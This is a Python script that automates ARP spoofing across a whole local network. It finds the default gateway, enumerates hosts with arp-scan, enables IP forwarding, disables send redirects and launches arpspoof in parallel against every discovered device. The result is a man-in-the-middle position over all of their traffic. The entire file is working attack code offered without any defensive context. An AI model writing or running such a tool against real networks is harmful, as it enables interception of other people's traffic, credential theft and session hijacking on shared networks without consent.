import subprocess
import re
from concurrent.futures import ThreadPoolExecutor
import os
import sys



def get_default_gateway_linux():
    try:
        result = os.popen("ip route show default").read()
        gateway_ip = result.split(" ")[2]
        return gateway_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

# Example usage
gateway_ip = get_default_gateway_linux()

if gateway_ip:
    print("Default Gateway IP:", gateway_ip)
else:
    print("Unable to determine the default gateway.")


def get_ips_from_arp_scan():
    # Function to run arp-scan and capture its output
    arp_scan_output = subprocess.check_output(["arp-scan", "--localnet"]).decode("utf-8")
    ip_pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+)')
    ip_list = ip_pattern.findall(arp_scan_output)
    return ip_list

def run_arpspoof(device, gateway, interface):
    command = f"sudo arpspoof -i {interface} -t {device} {gateway_ip}"


    # Run the command and capture the output
    result = subprocess.run(command, shell=True, stderr=subprocess.PIPE, text=True)

    # Print the output and return code
    print(f'Output for {device}:', result.stderr)
    print(f'Return Code for {device}:', result.returncode)

# Replace 'your_command_here' with the actual Bash command you want to run
devices = get_ips_from_arp_scan()
interface = sys.argv[1]
# Disable send redirects for all interfaces
command1 = "sudo sysctl -w net.ipv4.conf.all.send_redirects=0"

# Enable IP forwarding
command2 = "sudo sysctl net.ipv4.ip_forward=1"

# Run the sysctl commands
subprocess.run(command1, shell=True, check=True)
subprocess.run(command2, shell=True, check=True)

# Run ARP spoofing commands in parallel
with ThreadPoolExecutor(max_workers=len(devices)) as executor:
    print("*"*100)
    print("Network arp spoof started")
    print("*"*100)
    
    executor.map(run_arpspoof, devices, [gateway_ip]*len(devices), [interface]*len(devices))


